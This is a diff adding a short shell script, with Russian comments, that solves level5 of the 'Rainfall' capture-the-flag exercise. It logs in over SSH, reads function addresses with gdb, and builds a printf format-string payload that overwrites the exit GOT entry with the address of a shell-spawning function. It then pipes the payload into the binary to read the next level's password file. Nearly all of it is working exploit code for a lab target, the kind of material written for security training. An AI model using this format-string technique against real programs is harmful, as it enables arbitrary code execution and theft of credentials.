@@ -1,0 +1,20 @@
+# 1. Запустить программу в дебаггере
+# 2. Найти функции main, n и o
+# 3. Шелл открывается в o, но o не вызывается
+# 4. В n вызывается printf, затем exit
+# 5. Определить позицию буфера относительно аргументов printf - 4
+# 6. Найти адрес функций o и exit
+# 7. Создать форматную строку printf для замены адреса exit на адрес o
+# 8. Запустить программу со этой строкой и получить пароль
+
+ssh level5@"$RAINFALL_IP" -p 4242 '
+    # нахождение адресов функций
+    O_ADDRESS=$(gdb --batch -ex "x/i o" ./level5 | awk "{print \$1}")
+    EXIT_ADDRESS=$(gdb --batch -ex "x/i exit" ./level5 | awk "{print substr(\$NF, 4)}")
+    # создание строки
+    if ((${#EXIT_ADDRESS} % 2 == 1)); then EXIT_ADDRESS="0${EXIT_ADDRESS}"; fi
+    EXIT_ADDRESS="\x${EXIT_ADDRESS:6:2}\x${EXIT_ADDRESS:4:2}\x${EXIT_ADDRESS:2:2}\x${EXIT_ADDRESS:0:2}"
+    python -c "print \"$EXIT_ADDRESS%$((O_ADDRESS - 4))x%4\$n\"" > /tmp/level5
+    # запуск программы и получение флага
+    (cat /tmp/level5 - | ./level5) <<< "cat /home/user/level6/.pass"
+'
